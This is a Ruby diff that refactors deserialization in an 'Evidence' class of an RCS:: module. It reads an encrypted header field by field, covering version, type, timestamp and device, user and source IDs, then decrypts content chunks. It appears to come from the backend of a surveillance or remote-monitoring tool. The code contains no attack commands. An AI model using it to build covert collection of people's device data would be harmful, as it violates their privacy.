@@ -153,45 +153,59 @@ class Evidence
     
     return self
   end
+
+  def read_uint32(data)
+    data.read(4).unpack("I").shift
+  end
   
   def deserialize(data)
     
-    raise EvidenceDeserializeError("no content!") if data.nil?
+    raise EvidenceDeserializeError.new("no content!") if data.nil?
     
     @binary = data
     binary_string = StringIO.new @binary
-
+    
     # header
-    header_length = binary_string.read(4).unpack("I").shift
+    header_length = read_uint32(binary_string)
     header_string = StringIO.new decrypt(binary_string.read header_length)
-    header_ptr = FFI::MemoryPointer.from_string header_string.read(EvidenceHeader.size)
-    header = EvidenceHeader.new header_ptr
-
+    @version = read_uint32(header_string)
+    @type_id = read_uint32(header_string)
+    time_h = read_uint32(header_string)
+    time_l = read_uint32(header_string)
+    deviceid_size = read_uint32(header_string)
+    userid_size = read_uint32(header_string)
+    sourceid_size = read_uint32(header_string)
+    additional_size = read_uint32(header_string)
+    
+    #header_string = StringIO.new decrypt(binary_string.read header_length)
+    #header_ptr = FFI::MemoryPointer.from_string header_string.read(EvidenceHeader.size)
+    #header = EvidenceHeader.new header_ptr
+    
     # check that version is correct
-    raise EvidenceDeserializeError("mismatching version") unless header[:version] == Evidence.VERSION_ID
-
-    @timestamp = Time.from_filetime(header[:time_h], header[:time_l])
-    @device_id = header_string.read(header[:deviceid_size]).force_encoding('UTF-16LE') unless header[:deviceid_size] == 0
-    @user_id = header_string.read(header[:userid_size]).force_encoding('UTF-16LE') unless header[:userid_size] == 0
-    @source_id = header_string.read(header[:sourceid_size]).force_encoding('UTF-16LE') unless header[:sourceid_size] == 0
-
+    raise EvidenceDeserializeError.new("mismatching version [expected #{Evidence.VERSION_ID}, found #{@version}]") unless @version == Evidence.VERSION_ID
+    
+    @timestamp = Time.from_filetime(time_h, time_l)
+    @device_id = header_string.read(deviceid_size).force_encoding('UTF-16LE') unless deviceid_size == 0
+    @user_id = header_string.read(userid_size).force_encoding('UTF-16LE') unless userid_size == 0
+    @source_id = header_string.read(sourceid_size).force_encoding('UTF-16LE') unless sourceid_size == 0
+    
     # extend class depending on evidence type
     begin
-      @type = EVIDENCE_TYPES[ header[:type] ]
+      @type = EVIDENCE_TYPES[ @type_id ]
       extend_on_type @type
     rescue Exception => e
-      raise EvidenceDeserializeError("unknown type")
+      raise EvidenceDeserializeError.new("unknown type")
     end
     
-    if header[:additional_size] != 0
-      additional_data = header_string.read header[:additional_size]
+    unless additional_size == 0
+      additional_data = header_string.read additional_size
       decode_additional_header(additional_data) if respond_to? :decode_additional_header
     end
     
     # split content to chunks
     @content = ''
     while not binary_string.eof?
-      len = binary_string.read(4).unpack("I").shift
+      len = read_uint32(binary_string)
       content = binary_string.read align_to_block_len(len)
       @content += StringIO.new( decrypt(content) ).read(len)
     end
@@ -199,13 +213,6 @@ class Evidence
     return self
   end
   
-end
-
-class EvidenceDeserializeError < StandardError
-  attr_reader :msg
-  def initialize(msg)
-    @msg = msg
-  end
 end
 
 end # RCS::
